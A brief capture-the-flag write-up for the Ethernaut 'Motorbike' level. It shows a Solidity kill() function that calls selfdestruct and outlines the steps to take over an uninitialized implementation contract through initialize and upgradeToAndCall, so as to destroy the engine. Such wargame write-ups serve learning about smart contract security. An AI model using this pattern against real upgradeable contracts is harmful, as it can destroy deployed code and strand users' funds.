# Motorbike

---
Objective: 
- Ethernaut's motorbike has a brand new upgradeable engine design.

- Would you be able to selfdestruct its engine and make the motorbike unusable?
---

We make the motorbike unusable with uploading our own code to the contract as a 
```solidity
function kill() external {
        selfdestruct(payable(address(0)));
}
```

To do this we can call the initialize and then prepare with `upgradeToAndCall` 
